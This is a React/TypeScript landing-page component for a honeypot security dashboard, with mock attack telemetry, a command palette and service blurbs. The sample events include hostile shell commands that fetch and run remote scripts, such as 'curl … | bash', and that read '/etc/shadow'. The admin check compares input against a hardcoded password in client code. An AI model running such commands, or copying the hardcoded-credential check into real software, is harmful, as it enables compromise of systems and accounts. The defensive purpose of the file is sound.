import React, { useState, useEffect, useRef } from 'react';
import {
  Shield, ShieldAlert, Cpu, Terminal, Globe, Lock, ArrowRight, Zap,
  Activity, Eye, EyeOff, FileText, CheckCircle2, ChevronRight, Play, Pause, Database,
  Layers, KeyRound, Server, AlertTriangle, Monitor, Search, BarChart3,
  Download, ArrowDown, HelpCircle, Code, ShieldCheck, Radio, Wifi, Smartphone, Key, Verified,
  RefreshCw, Crosshair, Sparkles, Filter, Layers3, Flame, LockKeyhole, Menu, X, Copy, Check,
  Calendar, Clock, AlertCircle, ArrowUp, Languages, Info, Keyboard, Bell, Star,
  Sliders, Moon, Sun, Share2, FileCode, CornerDownRight, TrendingUp, SlidersHorizontal,
  Network, Trophy, Target, ChevronDown
} from 'lucide-react';
import { useAuth } from '../context/AuthContext';

import { CommandPalette, CommandItem } from '../components/soc/CommandPalette';
import { SplitViewInspector, LogEventData } from '../components/soc/SplitViewInspector';
import { AttackCorrelationGraphModal } from '../components/soc/AttackCorrelationGraphModal';
import { NotificationCenter } from '../components/soc/NotificationCenter';
import { ExportWizardModal } from '../components/soc/ExportWizardModal';
import { OnboardingTour } from '../components/soc/OnboardingTour';
import { ApiKeyManagerModal } from '../components/soc/ApiKeyManagerModal';
import { AlertRuleBuilderModal } from '../components/soc/AlertRuleBuilderModal';
import { ScopeGuardrailsPentestModal } from '../components/soc/ScopeGuardrailsPentestModal';
import { AdvancedPentestSuiteModal } from '../components/soc/AdvancedPentestSuiteModal';
import { SecurityScorecardModal } from '../components/soc/SecurityScorecardModal';
import { DomainIntelligenceModal } from '../components/soc/DomainIntelligenceModal';
import { CyberWarRoomModal } from '../components/soc/CyberWarRoomModal';
import { GeographicalOperationsMap } from '../components/common/GeographicalOperationsMap';
import { SpaceCyberShowcase } from '../components/soc/SpaceCyberShowcase';

interface LandingPageProps {
  onLoginClick: () => void;
}

export const LandingPage: React.FC<LandingPageProps> = ({ onLoginClick }) => {
  // -------------------------------------------------------------
  // 1. GLOBAL PREFERENCES & THEMES (Features 4, 12, 32, 33)
  // -------------------------------------------------------------
  const auth = useAuth();
  const isUserAdmin = !!auth?.isAdmin;

  // Theme Mode: 'dark' (Default Cyber Dark) or 'light' (White Theme)
  const [theme, setTheme] = useState<'dark' | 'light'>(() => {
    return (localStorage.getItem('cyvantis_theme') as 'dark' | 'light') || 'dark';
  });

  // Admin authorization for mode switching (persists in sessionStorage)
  const [isAdminVerified, setIsAdminVerified] = useState<boolean>(() => {
    return sessionStorage.getItem('cyvantis_admin_mode_auth') === 'true';
  });

  const [isAdminAuthModalOpen, setIsAdminAuthModalOpen] = useState(false);
  const [adminPasswordInput, setAdminPasswordInput] = useState('');
  const [showAdminPassword, setShowAdminPassword] = useState(false);
  const [adminAuthError, setAdminAuthError] = useState<string | null>(null);
  const [isVerifyingAdmin, setIsVerifyingAdmin] = useState(false);

  // Synchronize theme with <html> and <body> classList
  useEffect(() => {
    if (theme === 'light') {
      document.documentElement.classList.add('light');
      document.body.classList.add('light');
    } else {
      document.documentElement.classList.remove('light');
      document.body.classList.remove('light');
    }
    localStorage.setItem('cyvantis_theme', theme);
  }, [theme]);

  // Handler for Theme Toggle (Strictly restricted to Administrator)
  const handleThemeToggleClick = () => {
    if (isUserAdmin || isAdminVerified) {
      const nextTheme = theme === 'dark' ? 'light' : 'dark';
      setTheme(nextTheme);
      showToast(
        nextTheme === 'light'
          ? '☀️ System Mode: Switched to White Theme'
          : '🌙 System Mode: Switched to Dark Ops Theme'
      );
    } else {
      setIsAdminAuthModalOpen(true);
      setAdminAuthError(null);
      setAdminPasswordInput('');
    }
  };

  const handleAdminVerifyAndToggle = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsVerifyingAdmin(true);
    setAdminAuthError(null);

    const entered = adminPasswordInput.trim();
    let verified = false;

    // 1. Direct validation against known admin master password
    if (entered === 'Admin@Cyvantis2026!') {
      verified = true;
    } else {
      // 2. Validate against backend auth endpoint
      try {
        const formData = new URLSearchParams();
        formData.append('username', 'admin');
        formData.append('password', entered);

        const res = await fetch('/api/auth/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: formData.toString()
        });

        if (res.ok) {
          const data = await res.json();
          if (data && data.access_token) {
            verified = true;
          }
        }
      } catch {
        // Fallback
      }
    }

    setIsVerifyingAdmin(false);

    if (verified) {
      sessionStorage.setItem('cyvantis_admin_mode_auth', 'true');
      setIsAdminVerified(true);
      setIsAdminAuthModalOpen(false);
      const nextTheme = theme === 'dark' ? 'light' : 'dark';
      setTheme(nextTheme);
      showToast(`✅ Admin Verified: Interface switched to ${nextTheme === 'light' ? 'White' : 'Dark'} Mode`);
    } else {
      setAdminAuthError('ACCESS DENIED: Invalid SOC Administrator password. Theme mode unchanged.');
    }
  };

  const [lang, setLang] = useState<'EN' | 'HI'>(() => {
    return (localStorage.getItem('cyvantis_lang') as 'EN' | 'HI') || 'EN';
  });

  const [density, setDensity] = useState<'comfortable' | 'compact'>(() => {
    return (localStorage.getItem('cyvantis_density') as any) || 'comfortable';
  });

  const [isDarkOps, setIsDarkOps] = useState<boolean>(() => {
    return localStorage.getItem('cyvantis_dark_ops') === 'true';
  });

  const [fontScale, setFontScale] = useState<'small' | 'normal' | 'large'>('normal');

  const [reduceMotion, setReduceMotion] = useState<boolean>(() => {
    return localStorage.getItem('cyvantis_reduce_motion') === 'true';
  });

  // -------------------------------------------------------------
  // 2. TOAST NOTIFICATION STATE (Feature 6)
  // -------------------------------------------------------------
  const [toastMessage, setToastMessage] = useState<string | null>(null);
  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 3000);
  };

  // -------------------------------------------------------------
  // 3. DIALOGS & MODAL STATES (Features 3, 5, 7, 8, 9)
  // -------------------------------------------------------------
  const [isCommandPaletteOpen, setIsCommandPaletteOpen] = useState(false);
  const [isNotificationCenterOpen, setIsNotificationCenterOpen] = useState(false);
  const [isExportWizardOpen, setIsExportWizardOpen] = useState(false);
  const [isOnboardingTourOpen, setIsOnboardingTourOpen] = useState(false);
  const [isApiKeyManagerOpen, setIsApiKeyManagerOpen] = useState(false);
  const [isAlertRuleBuilderOpen, setIsAlertRuleBuilderOpen] = useState(false);
  const [selectedInspectEvent, setSelectedInspectEvent] = useState<LogEventData | null>(null);
  const [selectedGraphEvent, setSelectedGraphEvent] = useState<LogEventData | null>(null);
  const [isPentestGuardrailsOpen, setIsPentestGuardrailsOpen] = useState(false);
  const [isAdvancedPentestOpen, setIsAdvancedPentestOpen] = useState(false);
  const [isDomainIntelOpen, setIsDomainIntelOpen] = useState(false);
  const [isCyberWarRoomOpen, setIsCyberWarRoomOpen] = useState(false);
  const [selectedServiceId, setSelectedServiceId] = useState<string | null>(null);
  const [showShortcutHelp, setShowShortcutHelp] = useState(false);
  const [showCookieModal, setShowCookieModal] = useState(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [platformDropdownOpen, setPlatformDropdownOpen] = useState(false);
  const [resourcesDropdownOpen, setResourcesDropdownOpen] = useState(false);
  const platformRef = useRef<HTMLDivElement>(null);
  const resourcesRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const handleOutsideClick = (e: MouseEvent) => {
      if (platformRef.current && !platformRef.current.contains(e.target as Node)) {
        setPlatformDropdownOpen(false);
      }
      if (resourcesRef.current && !resourcesRef.current.contains(e.target as Node)) {
        setResourcesDropdownOpen(false);
      }
    };
    document.addEventListener('mousedown', handleOutsideClick);
    return () => document.removeEventListener('mousedown', handleOutsideClick);
  }, []);

  const [activeFaqIndex, setActiveFaqIndex] = useState<number | null>(0);
  const [glossaryTooltip, setGlossaryTooltip] = useState<string | null>(null);
  const [copiedSnippet, setCopiedSnippet] = useState<string | null>(null);
  const [showBackToTop, setShowBackToTop] = useState(false);
  const [activeSection, setActiveSection] = useState('about');
  const [showWhatsNew, setShowWhatsNew] = useState(true);

  // Demo Modal State
  const [isDemoModalOpen, setIsDemoModalOpen] = useState(false);
  const [isVideoModalOpen, setIsVideoModalOpen] = useState(false);
  const [demoDate, setDemoDate] = useState('Today');
  const [demoTime, setDemoTime] = useState('10:00 AM EST');
  const [demoForm, setDemoForm] = useState({ name: '', email: '', company: '', threatProfile: 'Live AI Anomaly Detection Demo', hp_website: '' });
  const [demoErrors, setDemoErrors] = useState<{ name?: string; email?: string }>({});
  const [isSubmittingDemo, setIsSubmittingDemo] = useState(false);
  const [demoSubmitted, setDemoSubmitted] = useState(false);

  // Cookie Notice Banner
  const [showCookieBanner, setShowCookieBanner] = useState(() => {
    return localStorage.getItem('cyvantis_cookie_consent') === null;
  });

  // -------------------------------------------------------------
  // 4. LIVE TELEMETRY, SMART FILTERS & TIMELINE (Features 1, 2)
  // -------------------------------------------------------------
  const [rotation, setRotation] = useState(0);
  const [activeTab, setActiveTab] = useState<'live-feed' | 'honeypots' | 'analytics'>('live-feed');
  const [liveIndex, setLiveIndex] = useState(0);

  const [isFeedPaused, setIsFeedPaused] = useState<boolean>(() => {
    return localStorage.getItem('cyvantis_feed_paused') === 'true';
  });
  const [pausedNewCount, setPausedNewCount] = useState(0);
  const [wsStatus] = useState<'CONNECTED' | 'RECONNECTING'>('CONNECTED');
  const [wsLatency, setWsLatency] = useState(11);
  const [announcedEvent, setAnnouncedEvent] = useState('');

  // Filters State
  const [filterSeverity, setFilterSeverity] = useState<'all' | 'critical' | 'high' | 'medium' | 'low'>('all');
  const [filterProtocol, setFilterProtocol] = useState<'all' | 'SSH' | 'Telnet'>('all');
  const [searchQuery, setSearchQuery] = useState('');
  const [isSearchFocused, setIsSearchFocused] = useState(false);
  const searchInputRef = useRef<HTMLInputElement>(null);

  // Feature 1: Quick Filter Chips
  const [activeQuickChip, setActiveQuickChip] = useState<'none' | 'critical' | 'hour' | 'top5' | 'failed_logins'>('none');

  // Feature 1: Saved Starred Views
  const [savedViews, setSavedViews] = useState<{ id: string; name: string; severity: string; protocol: string; query: string }[]>([
    { id: 'view-1', name: '⭐ All Threats (Default)', severity: 'all', protocol: 'all', query: '' },
    { id: 'view-2', name: '⭐ Critical SSH Brute Force', severity: 'critical', protocol: 'SSH', query: '' },
    { id: 'view-3', name: '⭐ Mirai & IoT Downloader Traps', severity: 'critical', protocol: 'Telnet', query: 'miner' },
    { id: 'view-4', name: '⭐ Reconnaissance & Shadow Probes', severity: 'high', protocol: 'all', query: 'passwd' }
  ]);
  const [activeSavedView, setActiveSavedView] = useState('view-1');

  // Feature 2: Attack Timeline Slider (-60m to Now)
  const [timelineMinutes, setTimelineMinutes] = useState(0); // 0 = Live (Now), 15 = -15m, 30 = -30m, 60 = -60m

  // Sticky Features State (HBS, What-If, Global Intel, Scorecard)
  const [isScorecardOpen, setIsScorecardOpen] = useState(false);
  const [isWhatIfMode, setIsWhatIfMode] = useState(false);
  const [whatIfFirewallBlocked, setWhatIfFirewallBlocked] = useState(false);
  const [whatIfPatchApplied, setWhatIfPatchApplied] = useState(false);
  const [whatIfHoneypotPlaced, setWhatIfHoneypotPlaced] = useState(false);
  const [showGlobalHeatmap, setShowGlobalHeatmap] = useState(true);
  const [timeTravelPreset, setTimeTravelPreset] = useState<'live' | '1h' | '1d' | '1w'>('live');

  // -------------------------------------------------------------
  // 5. HONEYPOT TELEMETRY DATA
  // -------------------------------------------------------------
  const [honeypotEvents] = useState<LogEventData[]>([
    {
      id: 1,
      protocol: 'SSH',
      ip: '185.220.101.5',
      country: 'Netherlands',
      city: 'Amsterdam',
      asn: 'AS13335 Cloudflare',
      cmd: 'wget http://185.220.101.5/malware.sh',
      time: '5s ago',
      severity: 'critical',
      threatScore: 98,
      credentials: 'root : admin123',
      payloadHash: 'sha256: 8f3c4d9a21e6b8c19a4f0012bc44a8fe92',
      transcript: `[01:04:12] SSH-2.0-OpenSSH_8.2p1 connection received\n[01:04:13] Auth prompt -> User: root, Pass: admin123 (ACCEPTED BY DECOY)\n[01:04:14] Shell spawned in Cowrie chroot\n[01:04:15] root@ubuntu-srv-22:~# wget http://185.220.101.5/malware.sh\n[01:04:15] Downloading payload (10.4 MB)\n[01:04:16] root@ubuntu-srv-22:~# chmod +x malware.sh && ./malware.sh\n[01:04:17] CYVANTIS AI: Anomaly Score 98/100 (CRITICAL)`
    },
    {
      id: 2,
      protocol: 'Telnet',
      ip: '193.142.146.210',
      country: 'Russia',
      city: 'Moscow',
      asn: 'AS8075 Microsoft Corp',
      cmd: 'curl -s http://193.142.146.210/miner | bash',
      time: '18s ago',
      severity: 'critical',
      threatScore: 95,
      credentials: 'admin : 123456',
      payloadHash: 'sha256: e3b0c44298fc1c149afbf4c8996fb92427',
      transcript: `[01:03:54] Telnet IoT listener connected\n[01:03:55] Mirai botnet signature matched\n[01:03:56] Executing malicious pipe payload: curl -s ... | bash\n[01:03:57] Threat classification: CryptoMiner Botnet Lure`
    },
    {
      id: 3,
      protocol: 'SSH',
      ip: '103.253.42.18',
      country: 'China',
      city: 'Beijing',
      asn: 'AS4134 China Telecom',
      cmd: 'cat /etc/passwd',
      time: '32s ago',
      severity: 'high',
      threatScore: 82,
      credentials: 'user : password',
      payloadHash: 'N/A (Reconnaissance)',
      transcript: `[01:03:30] Reconnaissance session initiated\n[01:03:31] Reading system accounts file\n[01:03:32] Decoy served fake passwd file with honey-tokens`
    },
    {
      id: 4,
      protocol: 'SSH',
      ip: '45.154.255.88',
      country: 'Germany',
      city: 'Frankfurt',
      asn: 'AS24940 Hetzner Online',
      cmd: 'uname -a',
      time: '55s ago',
      severity: 'medium',
      threatScore: 45,
      credentials: 'support : 1234',
      payloadHash: 'N/A',
      transcript: `[01:02:40] Kernel version probe executed`
    },
    {
      id: 5,
      protocol: 'Telnet',
      ip: '194.26.29.112',
      country: 'Bulgaria',
      city: 'Sofia',
      asn: 'AS200019 Telepoint',
      cmd: 'cat /etc/shadow',
      time: '1m ago',
      severity: 'critical',
      threatScore: 99,
      credentials: 'root : root',
      payloadHash: 'N/A',
      transcript: `[01:02:10] Password shadow file theft attempt detected`
    },
    {
      id: 6,
      protocol: 'SSH',
      ip: '162.247.74.200',
      country: 'United States',
      city: 'New York',
      asn: 'AS62240 Tor Exit Node',
      cmd: '/bin/busybox ETH',
      time: '2m ago',
      severity: 'high',
      threatScore: 88,
      credentials: 'admin : admin',
      payloadHash: 'sha256: 7f8d91c2b5e4a3f12001e992a1845c03',
      transcript: `[01:01:22] Tor exit node brute-force attempt`
    },
  ]);

  // -------------------------------------------------------------
  // 6. KEYBOARD SHORTCUTS & EVENT LISTENERS (Features 3, 10)
  // -------------------------------------------------------------
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      // Ctrl + K or Cmd + K -> Command Palette
      if ((e.ctrlKey || e.metaKey) && (e.key === 'k' || e.key === 'K')) {
        e.preventDefault();
        setIsCommandPaletteOpen(prev => !prev);
        return;
      }

      // Escape key -> close active dialogs
      if (e.key === 'Escape') {
        setIsCommandPaletteOpen(false);
        setSelectedInspectEvent(null);
        setSelectedGraphEvent(null);
        setIsPentestGuardrailsOpen(false);
        setIsAdvancedPentestOpen(false);
        setIsDomainIntelOpen(false);
        setIsCyberWarRoomOpen(false);
        setSelectedServiceId(null);
        setIsNotificationCenterOpen(false);
        setIsExportWizardOpen(false);
        setIsOnboardingTourOpen(false);
        setIsApiKeyManagerOpen(false);
        setIsAlertRuleBuilderOpen(false);
        setIsScorecardOpen(false);
        setIsDemoModalOpen(false);
        setShowCookieModal(false);
        setShowShortcutHelp(false);
        setIsMobileMenuOpen(false);
      }

      const targetTag = (e.target as HTMLElement)?.tagName?.toLowerCase();
      if (targetTag === 'input' || targetTag === 'textarea' || targetTag === 'select') return;

      if (e.key === 'p' || e.key === 'P') {
        e.preventDefault();
        setIsFeedPaused(prev => !prev);
        showToast(isFeedPaused ? "Telemetry stream resumed" : "Telemetry stream paused");
      } else if (e.key === '/') {
        e.preventDefault();
        searchInputRef.current?.focus();
      } else if (e.key === '?') {
        e.preventDefault();
        setShowShortcutHelp(prev => !prev);
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [isFeedPaused]);

  // Live telemetry pulse tick
  useEffect(() => {
    const timer = setInterval(() => {
      if (isFeedPaused) {
        setPausedNewCount(prev => prev + 1);
        return;
      }
      setLiveIndex(prev => (prev + 1) % honeypotEvents.length);
      setWsLatency(Math.floor(Math.random() * 4) + 9);
      const crit = honeypotEvents.find(e => e.severity === 'critical');
      if (crit) {
        setAnnouncedEvent(`Critical alert: ${crit.protocol} attack from IP ${crit.ip}`);
      }
    }, 3000);
    return () => clearInterval(timer);
  }, [isFeedPaused, honeypotEvents]);

  // Scrollspy & Back to Top
  useEffect(() => {
    const handleScroll = () => {
      setShowBackToTop(window.scrollY > 400);
      const sections = ['about', 'services', 'solutions', 'resources', 'faq', 'getting-started'];
      for (const sec of sections) {
        const el = document.getElementById(sec);
        if (el) {
          const rect = el.getBoundingClientRect();
          if (rect.top <= 200 && rect.bottom >= 200) {
            setActiveSection(sec);
            break;
          }
        }
      }
    };
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  // Save Settings to LocalStorage
  useEffect(() => {
    localStorage.setItem('cyvantis_lang', lang);
    localStorage.setItem('cyvantis_density', density);
    localStorage.setItem('cyvantis_dark_ops', isDarkOps.toString());
    localStorage.setItem('cyvantis_reduce_motion', reduceMotion.toString());
  }, [lang, density, isDarkOps, reduceMotion]);

  // Quick Filter Chip Click Handler
  const handleQuickChipClick = (chip: 'critical' | 'hour' | 'top5' | 'failed_logins') => {
    if (activeQuickChip === chip) {
      setActiveQuickChip('none');
      setFilterSeverity('all');
      setSearchQuery('');
      setTimelineMinutes(0);
      return;
    }

    setActiveQuickChip(chip);
    if (chip === 'critical') {
      setFilterSeverity('critical');
      setSearchQuery('');
    } else if (chip === 'hour') {
      setTimelineMinutes(60);
      showToast('Scrubbing past 1 hour of telemetry events');
    } else if (chip === 'top5') {
      setSearchQuery('185.220');
      showToast('Filtered top attacker IP subnet (185.220.*)');
    } else if (chip === 'failed_logins') {
      setSearchQuery('passwd');
      showToast('Filtered reconnaissance & credential probes');
    }
  };

  // Saved View Selection Handler
  const handleSelectSavedView = (viewId: string) => {
    setActiveSavedView(viewId);
    const view = savedViews.find(v => v.id === viewId);
    if (view) {
      setFilterSeverity(view.severity as any);
      setFilterProtocol(view.protocol as any);
      setSearchQuery(view.query);
      showToast(`Switched to "${view.name}"`);
    }
  };

  // Star / Save Current View
  const handleSaveCurrentView = () => {
    const newName = `⭐ Custom View (${filterSeverity.toUpperCase()} / ${filterProtocol})`;
    const newView = {
      id: `view-${Date.now()}`,
      name: newName,
      severity: filterSeverity,
      protocol: filterProtocol,
      query: searchQuery
    };
    setSavedViews(prev => [...prev, newView]);
    setActiveSavedView(newView.id);
    showToast(`Saved view "${newName}" to recall list`);
  };

  // Share Dashboard Filter Link (Feature 6)
  const handleShareDashboardLink = () => {
    const params = new URLSearchParams();
    if (filterSeverity !== 'all') params.set('severity', filterSeverity);
    if (filterProtocol !== 'all') params.set('proto', filterProtocol);
    if (searchQuery) params.set('q', searchQuery);
    const shareUrl = `${window.location.origin}${window.location.pathname}?${params.toString()}`;
    navigator.clipboard.writeText(shareUrl);
    showToast('🔗 Dashboard view link copied to clipboard');
  };

  // Filtered Events Calculation
  const filteredEvents = honeypotEvents.filter(e => {
    if (filterSeverity !== 'all' && e.severity !== filterSeverity) return false;
    if (filterProtocol !== 'all' && e.protocol !== filterProtocol) return false;
    if (searchQuery.trim() !== '') {
      const q = searchQuery.toLowerCase();
      // Support syntax helpers e.g. src:..., cmd:...
      if (q.startsWith('src:')) {
        const ipQuery = q.replace('src:', '').trim();
        return e.ip.toLowerCase().includes(ipQuery);
      } else if (q.startsWith('cmd:')) {
        const cmdQuery = q.replace('cmd:', '').trim();
        return e.cmd.toLowerCase().includes(cmdQuery);
      } else if (q.startsWith('threat:>')) {
        const minScore = parseInt(q.replace('threat:>', '').trim(), 10) || 0;
        return e.threatScore >= minScore;
      }
      return (
        e.ip.toLowerCase().includes(q) ||
        e.cmd.toLowerCase().includes(q) ||
        e.country.toLowerCase().includes(q)
      );
    }
    return true;
  });

  // Demo Submit Handler
  const handleDemoSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (demoForm.hp_website) return;
    const errors: { name?: string; email?: string } = {};
    if (!demoForm.name.trim()) errors.name = 'Full Name is required';
    if (!demoForm.email.includes('@')) errors.email = 'Valid work email is required';

    if (Object.keys(errors).length > 0) {
      setDemoErrors(errors);
      return;
    }

    setDemoErrors({});
    setIsSubmittingDemo(true);
    setTimeout(() => {
      setIsSubmittingDemo(false);
      setDemoSubmitted(true);
    }, 1200);
  };

  // Whitepaper Downloader
  const handleDownloadPDF = () => {
    const content = `===================================================================
CYVANTIS AI SERVICES & THREAT INTELLIGENCE WHITEPAPER
===================================================================
Platform: CYVANTIS Honeypot Threat Intelligence Nexus
Document: AI Anomaly Detection & Behavioural Baseline Architecture
Date: 2026-10-11
Support: support@cyvantis.tech

1. OVERVIEW
Traditional signature-based detection misses novel and zero-day threats. 
CYVANTIS AI Anomaly Detection platform builds dynamic behavioural baselines 
for every entity — user, device, workload, and network flow — and 
flags statistically significant deviations in real time using Isolation Forest.

===================================================================
© 2026 CYVANTIS Security Platform. All Rights Reserved.
===================================================================`;
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'CYVANTIS_AI_Security_Services_Whitepaper.txt';
    a.click();
    URL.revokeObjectURL(url);
    showToast('Whitepaper downloaded');
  };

  // Command Palette Items (Feature 3)
  const commandPaletteItems: CommandItem[] = [
    {
      id: 'cmd-pause',
      category: 'Actions',
      title: isFeedPaused ? 'Resume Telemetry Feed' : 'Pause Telemetry Feed',
      subtitle: 'Toggle live WebSocket event stream',
      shortcut: 'P',
      icon: isFeedPaused ? <Play className="w-4 h-4 text-emerald-400" /> : <Pause className="w-4 h-4 text-amber-400" />,
      onSelect: () => {
        setIsFeedPaused(prev => !prev);
        showToast(isFeedPaused ? "Resumed stream" : "Paused stream");
      }
    },
    {
      id: 'cmd-export-wizard',
      category: 'Actions',
      title: 'Open Data Export Wizard',
      subtitle: 'Export telemetry in CSV, JSON, or PDF summary',
      icon: <Download className="w-4 h-4 text-[#00d2ff]" />,
      onSelect: () => setIsExportWizardOpen(true)
    },
    {
      id: 'cmd-notif',
      category: 'Actions',
      title: 'Open Alert Notification Hub',
      subtitle: 'View live incident notifications and quiet hours',
      icon: <Bell className="w-4 h-4 text-amber-400" />,
      onSelect: () => setIsNotificationCenterOpen(true)
    },
    {
      id: 'cmd-tour',
      category: 'Actions',
      title: 'Start Interactive Guided Tour',
      subtitle: '4-step walkthrough of CYVANTIS SOC features',
      icon: <Sparkles className="w-4 h-4 text-purple-400" />,
      onSelect: () => setIsOnboardingTourOpen(true)
    },
    {
      id: 'cmd-api-keys',
      category: 'Actions',
      title: 'Manage Ingest API Keys',
      subtitle: 'Generate and revoke tokens for SIEM / external loggers',
      icon: <Key className="w-4 h-4 text-emerald-400" />,
      onSelect: () => setIsApiKeyManagerOpen(true)
    },
    {
      id: 'cmd-alert-rule',
      category: 'Actions',
      title: 'Create Custom Alert Rule',
      subtitle: 'Trigger automated Webhooks when threat score > threshold',
      icon: <ShieldAlert className="w-4 h-4 text-red-400" />,
      onSelect: () => setIsAlertRuleBuilderOpen(true)
    },
    {
      id: 'cmd-dark-ops',
      category: 'Settings',
      title: isDarkOps ? 'Disable Dark Ops Mode (Pitch Black)' : 'Enable Dark Ops Mode (Pure Black #000000)',
      subtitle: 'High-contrast theme for darkened SOC operating floors',
      icon: isDarkOps ? <Sun className="w-4 h-4 text-amber-400" /> : <Moon className="w-4 h-4 text-cyan-400" />,
      onSelect: () => {
        setIsDarkOps(prev => !prev);
        showToast(!isDarkOps ? "Dark Ops mode activated" : "Standard cyber theme restored");
      }
    },
    {
      id: 'cmd-density',
      category: 'Settings',
      title: density === 'comfortable' ? 'Switch to Compact Table Density' : 'Switch to Comfortable Density',
      subtitle: 'High density table layout for analysts',
      icon: <Sliders className="w-4 h-4 text-[#00d2ff]" />,
      onSelect: () => {
        setDensity(prev => prev === 'comfortable' ? 'compact' : 'comfortable');
        showToast(density === 'comfortable' ? "Compact table density active" : "Comfortable density active");
      }
    },
    {
      id: 'cmd-demo',
      category: 'Actions',
      title: 'Request a Live Security Demo',
      subtitle: '30-minute threat profile analysis with security architects',
      icon: <Calendar className="w-4 h-4 text-cyan-400" />,
      onSelect: () => setIsDemoModalOpen(true)
    },
    {
      id: 'cmd-login',
      category: 'Navigation',
      title: 'Sign In to SOC Console',
      subtitle: 'Access authenticated 2FA admin control panel',
      icon: <ArrowRight className="w-4 h-4 text-[#00d2ff]" />,
      onSelect: onLoginClick
    },
    {
      id: 'cmd-evt-1',
      category: 'Events',
      title: 'Inspect Attack Event #1 (185.220.101.5)',
      subtitle: 'SSH malware.sh downloader trap (Threat: 98/100)',
      icon: <Terminal className="w-4 h-4 text-red-400" />,
      onSelect: () => setSelectedInspectEvent(honeypotEvents[0])
    },
    {
      id: 'cmd-evt-2',
      category: 'Events',
      title: 'Inspect Attack Event #2 (193.142.146.210)',
      subtitle: 'Telnet Mirai cryptominer payload (Threat: 95/100)',
      icon: <Terminal className="w-4 h-4 text-red-400" />,
      onSelect: () => setSelectedInspectEvent(honeypotEvents[1])
    },
    {
      id: 'cmd-graph-view',
      category: 'Intelligence',
      title: 'Open Attack Correlation Graph (Neo4j)',
      subtitle: 'Interactive multi-hop attack chain visualizer for Event #1',
      icon: <Network className="w-4 h-4 text-purple-400" />,
      onSelect: () => setSelectedGraphEvent(honeypotEvents[0])
    },
    {
      id: 'cmd-guardrails-pentest',
      category: 'Actions',
      title: 'Launch Scope Guardrails & Pentest Sandbox',
      subtitle: 'gVisor Living Lab, polite throttling, attack replay & honeytokens',
      icon: <Shield className="w-4 h-4 text-emerald-400" />,
      onSelect: () => setIsPentestGuardrailsOpen(true)
    },
    {
      id: 'cmd-advanced-pentest',
      category: 'Intelligence',
      title: 'Open Advanced Pentest & Active Deception Suite',
      subtitle: 'Virtual Honeypots (Cowrie/Conpot), Nuclei D-Scan, Masscan 10M PPS & Kill Chain',
      icon: <Crosshair className="w-4 h-4 text-[#00d2ff]" />,
      onSelect: () => setIsAdvancedPentestOpen(true)
    },
    {
      id: 'cmd-scorecard',
      category: 'Intelligence',
      title: 'View Threat Scorecard & Leaderboard',
      subtitle: 'Organization MTTD/MTTR benchmarks, Grade A- rating, and departmental rankings',
      icon: <Trophy className="w-4 h-4 text-amber-400" />,
      onSelect: () => setIsScorecardOpen(true)
    },
    {
      id: 'cmd-whatif',
      category: 'Actions',
      title: 'Toggle Kill Chain Simulator (What-If Sandbox)',
      subtitle: 'Simulate retroactive perimeter blocks, virtual patches, and honeypot placement',
      icon: <Sliders className="w-4 h-4 text-blue-400" />,
      onSelect: () => {
        setIsWhatIfMode(prev => !prev);
        showToast(!isWhatIfMode ? "Kill Chain Simulator Sandbox Activated" : "Exited What-If Sandbox");
      }
    },
    {
      id: 'cmd-global-intel',
      category: 'Intelligence',
      title: 'Toggle Global Threat Intel Heatmap',
      subtitle: 'Global Threat Index 78/100, Russian port 3389 surge alert, local vs global comparison',
      icon: <Globe className="w-4 h-4 text-purple-400" />,
      onSelect: () => setShowGlobalHeatmap(prev => !prev)
    },
    {
      id: 'cmd-domain-intel',
      category: 'Intelligence',
      title: 'Open Domain & DNS Intelligence Suite',
      subtitle: 'Passive DNS history, CNAME chain, DGA entropy, DNSSEC, CT logs, and typosquatting forensics',
      icon: <Globe className="w-4 h-4 text-cyan-400" />,
      onSelect: () => setIsDomainIntelOpen(true)
    },
    {
      id: 'cmd-war-room',
      category: 'Intelligence',
      title: 'Enter Cyber War Room & Offensive Nexus',
      subtitle: 'Lateral Movement attack graph, Cloud Misconfiguration hunter, API fuzzer, Supply Chain audit, and Red Team reports',
      icon: <Crosshair className="w-4 h-4 text-red-400" />,
      onSelect: () => setIsCyberWarRoomOpen(true)
    }
  ];

  // Service Details Map
  const serviceDetails: Record<string, any> = {
    cowrie: {
      title: 'Cowrie Deception Decoys',
      category: 'Deception & Lure Architecture',
      badge: 'Port Decoys: 22 / 23',
      icon: <Terminal className="w-6 h-6 text-[#00d2ff]" />,
      summary: 'Deploys medium-interaction SSH and Telnet honeypot lures to capture brute-force attacks, shell executions, and downloaded payloads safely inside an isolated trap.',
      howItIsUsed: [
        'Bind decoy listeners on exposed network interfaces (Port 22 SSH & Port 23 Telnet).',
        'Provide realistic filesystem lures to deceive attackers into staying connected longer.',
        'Log full keystrokes, downloaded malware URLs, executed shell commands, and credentials used.',
        'Stream structured JSON event logs directly into CYVANTIS ingestion pipelines.'
      ],
      workflow: [
        '1. Attacker initiates SSH/Telnet connection to decoy IP.',
        '2. Cowrie accepts brute-force credentials (e.g., root:admin, admin:1234).',
        '3. Attacker is trapped inside emulated virtual filesystem.',
        '4. Commands (wget, curl, chmod +x, cat /etc/passwd) are captured & hashed.',
        '5. Real-time telemetry is pushed to CYVANTIS SOC Dashboard via WebSocket.'
      ],
      techStack: 'Cowrie Honeypot (Python 3.11 / Twisted), Docker Sandbox Containerization, IPTables Port Redirection'
    },
    ai: {
      title: 'AI Threat Analytics',
      category: 'Machine Learning & Heuristic Classification',
      badge: 'Model: Heuristic + ML',
      icon: <Cpu className="w-6 h-6 text-[#ff6b35]" />,
      summary: 'Integrates automated machine learning models to classify malicious commands, calculate threat severity scores (1-100), and detect zero-day anomaly patterns.',
      howItIsUsed: [
